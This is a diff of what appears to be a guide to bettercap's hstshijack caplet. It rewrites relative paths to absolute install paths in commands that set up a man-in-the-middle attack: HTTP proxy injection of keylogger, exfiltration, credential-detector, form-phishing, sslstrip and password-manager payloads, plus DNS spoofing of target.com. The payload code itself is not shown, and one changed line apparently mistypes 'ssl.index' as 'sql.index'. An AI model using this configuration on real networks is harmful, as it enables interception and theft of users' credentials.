@@ -264,43 +264,43 @@ Password manager detection and bypass.
 
 **Option 1: Keylogger + Basic Hijack**
 ```bash
-set hstshijack.payloads *:./payloads/hijack-advanced.js,*:./payloads/keylogger-advanced.js
+set hstshijack.payloads *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js
 ```
 
 **Option 2: Full Intelligence Gathering**
 ```bash
 set hstshijack.payloads \
-  *:./payloads/hijack-advanced.js,\
-  *:./payloads/keylogger-advanced.js,\
-  *:./payloads/exfiltration-advanced.js,\
-  *:./payloads/credential-detector.js
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/exfiltration-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/credential-detector.js
 ```
 
 **Option 3: Maximum Extraction (All Payloads)**
 ```bash
 set hstshijack.payloads \
-  *:./payloads/hijack-advanced.js,\
-  *:./payloads/keylogger-advanced.js,\
-  *:./payloads/exfiltration-advanced.js,\
-  *:./payloads/credential-detector.js,\
-  *:./payloads/form-phisher-advanced.js,\
-  *:./payloads/sslstrip-advanced.js,\
-  *:./payloads/password-manager-advanced.js
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/exfiltration-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/credential-detector.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/form-phisher-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip-advanced.js,\
+  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/password-manager-advanced.js
 ```
 
 ### Complete hstshijack.cap Configuration
 
 ```bash
 # Advanced MITM with full payload injection
-set hstshijack.ssl.domains ./hstshijack.ssl.domains
-set hstshijack.ssl.index ./hstshijack.ssl.index
-set hstshijack.whitelist ./whitelist.json
+set hstshijack.ssl.domains /usr/local/share/bettercap/caplets/hstshijack/hstshijack.ssl.domains
+set hstshijack.ssl.index /usr/local/share/bettercap/caplets/hstshijack/hstshijack.sql.index
+set hstshijack.whitelist /usr/local/share/bettercap/caplets/hstshijack/whitelist.json
 set hstshijack.ignore captive.apple.com,connectivitycheck.gstatic.com,detectportal.firefox.com
 
 # Payload configuration - select based on testing goals
-set hstshijack.payloads *:./payloads/hijack-advanced.js,*:./payloads/keylogger-advanced.js,*:./payloads/exfiltration-advanced.js,*:./payloads/credential-detector.js
+set hstshijack.payloads *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack-advanced.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger-advanced.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/exfiltration-advanced.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/credential-detector.js
 
-set http.proxy.script ./hstshijack.js
+set http.proxy.script /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
 http.proxy on
 
 set dns.spoof.domains *.target.com,target.com
